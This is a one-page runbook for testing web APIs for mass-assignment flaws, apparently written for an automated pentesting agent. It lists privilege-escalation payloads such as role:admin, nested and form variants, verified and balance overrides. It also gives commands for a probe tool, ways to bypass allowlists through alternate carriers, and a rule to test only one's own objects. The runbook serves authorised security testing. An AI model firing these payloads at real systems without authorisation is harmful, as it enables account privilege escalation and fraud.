# Field manual — the mass-assignment runbook in one page

## The 60-second triage

1. `GET /api/me` (or the object detail) — dump the field list; every
   key the form doesn't send is a probe.
2. `PATCH /users/me` (the update endpoint) — the widest binder lives
   here; probe `role` flat first.
3. Control/canary pair — `{u,p}` vs `{u,p,role}`; read-back through a
   DIFFERENT `GET`.
4. Decision exercise — hit the gated route (`/admin`, `/premium`, the
   flag endpoint) with the new state.

## The probe order

```
1. PATCH /users/me  {"role":"admin"}              — widest binder
2. PATCH /users/me  {"profile":{"role":"admin"}}  — nested tunnel
3. POST /register   {"role":"admin"}              — flat, JSON
4. POST /register   role=admin                    — form carrier
5. PATCH /users/me  {"verified":true}             — second semantic
6. PATCH /users/me  {"balance":99999}             — third semantic
```

Stop at the first stored+decision-changed pair.

## The tool

```bash
python3 tools/web/binding_probe.py \
  --url "$BASE/api/register" --body 'username=p&password=x' \
  --readback "$BASE/api/me"
```

Default field set: `role`, `admin`, `is_admin`, `isAdmin`, `debug`,
`permissions`, `group`, `verified`, `is_staff`. `--fields` overrides;
`--method GET` tests query; `--headers` carries auth.

## The evidence pair

- **class**: read-back showing the stored field (`"role":"admin"` vs
  control `"user"`);
- **impact**: the gated route's `200` (or the bound total).

```bash
python3 tools/hooks.py post-probe <ch> \
  --request "PATCH /users/me role=admin" --verdict confirms \
  --class web-mass-assignment --hypothesis-id <id> \
  --evidence-kind class --evidence '"role":"admin"' \
  --response "$(cat readback.txt)"
```

## The falsifier read

| Result | Depth | Open cells |
|---|---|---|
| `400` on JSON | content-type | form, multipart |
| `200`+drop | endpoint | nested, PATCH, /import |
| drop everywhere | binder-family | GraphQL, admin |
| stored, `403` gate | inert field | `is_staff`, `permissions` |
| no privileged fields | model | class dead |

## The carrier fallback

`role` flat JSON dropped → `role=admin` form → `{"profile":{"role":..}}`
nested → `PATCH` → `PUT` → `/import` → GraphQL. The allowlist lives in
one cell; the matrix stays open until the depth kills it.

## The class boundary

`{"role":"admin"}` on your object → here. `{"author_id":9}` access →
`web-idor`. `__proto__`/`constructor` → `web-prototype-pollution`.
`$set` operators → `web-nosqli`. Step-skip requests → `web-logic-flaw`.

## The safety rule

Test on objects YOU created — never mutate another user's record until
the boundary is proven (AGENTS.md). PATCH your own `me`, not another
`id`.
